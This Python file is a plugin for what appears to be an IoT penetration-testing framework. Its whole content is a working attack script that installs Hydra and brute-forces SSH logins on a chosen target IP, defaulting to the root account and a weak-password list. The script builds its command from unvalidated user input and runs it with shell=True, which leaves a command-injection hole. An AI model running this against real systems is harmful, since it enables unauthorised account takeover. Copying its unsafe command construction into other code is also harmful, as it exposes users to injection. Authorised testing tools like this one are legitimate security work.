#!/usr/bin/python3

import logging
import pluggy
from typing import Optional, Any
import subprocess
from sat_toolkit.core.exploit_spec import ExploitResult
from sat_toolkit.models.Target_Model import TargetManager
from sat_toolkit.tools.input_mgr import Input_Mgr
from sat_toolkit.core.base_plugin import BasePlugin
from sat_toolkit.tools.privilege_mgr import PrivilegeManager
from sat_toolkit.tools.apt_mgr import AptMgr

logger = logging.getLogger(__name__)
hookimpl = pluggy.HookimplMarker("exploit_mgr")

class HydraSSHAttackPlugin(BasePlugin):
    def __init__(self):
        super().__init__({
            'Name': 'Hydra SSH Attack',
            'Description': 'Performs a brute-force SSH password attack using Hydra.',
            'License': 'GPL',
            'Author': ['iotsploit'],
            'RequiresRoot': False,
            'Parameters': {
                'username': {
                    'type': 'str',
                    'required': True,
                    'description': 'Username for SSH login',
                    'default': 'root'
                },
                'password_list': {
                    'type': 'str',
                    'required': True,
                    'description': 'Path to the password list file',
                    'default': 'plugins/exploits/hydra_cracker/weak_pass.txt'
                }
            }
        })

    @hookimpl
    def initialize(self, device_plugin: Optional[Any] = None):
        logger.info("Initializing HydraSSHAttackPlugin")
        if not AptMgr.is_package_installed("hydra"):
            logger.info("Hydra is not installed. Installing...")
            if not AptMgr.install_package("hydra"):
                logger.error("Failed to install Hydra. Please install it manually.")
                return

    @hookimpl
    def execute(self, target: Optional[Any] = None, parameters: Optional[dict] = None) -> ExploitResult:
        logger.info("Executing HydraSSHAttackPlugin")
        try:
            # Execute the attack
            result = self._execute_attack(target, parameters)
            return result
            
        except Exception as e:
            logger.error(f"Error during Hydra SSH attack: {str(e)}")
            return ExploitResult(False, f"Hydra SSH attack failed: {str(e)}", {})

    def _execute_attack(self, target, parameters):
        """Helper method to execute the actual attack"""
        logger.info(f"Executing HydraSSHAttackPlugin with target: {target} and parameters: {parameters}")
        target_manager = TargetManager.get_instance()
        current_target = target_manager.get_current_target()
        
        logger.info(f"Current target: {current_target}")
        if current_target is None:
            return ExploitResult(False, "No target selected. Please load a target first.", {})

        if parameters:
            username = parameters.get('username', 'root')
            password_list = parameters.get('password_list', 'plugins/exploits/hydra_cracker/weak_pass.txt')
        else:
            username = Input_Mgr.Instance().string_input("Enter the SSH username:")
            password_list = Input_Mgr.Instance().string_input("Enter the path to the password list file (default: plugins/exploits/hydra_cracker/weak_pass.txt):")
            if not password_list:
                password_list = 'plugins/exploits/hydra_cracker/weak_pass.txt'

        target_ip = current_target.ip_address
        if not target_ip:
            return ExploitResult(False, "Target IP address not found", {})

        command = f"hydra -l {username} -P {password_list} ssh://{target_ip}"
        logger.info(f"Running command: {command}")

        try:
            process = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, encoding="utf-8")
            if process.returncode == 0:
                logger.info(f"Hydra SSH attack successful. Output:\n{process.stdout}")
                return ExploitResult(True, "Hydra SSH attack executed successfully", {"output": process.stdout})
            else:
                logger.error(f"Hydra SSH attack failed. Error:\n{process.stderr}")
                return ExploitResult(False, "Hydra SSH attack failed", {"error": process.stderr})
        except Exception as e:
            logger.error(f"Error executing Hydra command: {str(e)}")
            return ExploitResult(False, f"Error executing Hydra command: {str(e)}", {})

    @hookimpl
    def cleanup(self):
        logger.info("Cleaning up HydraSSHAttackPlugin")
        pass

def register_plugin(pm):
    hydra_ssh_attack_plugin = HydraSSHAttackPlugin()
    pm.register(hydra_ssh_attack_plugin) 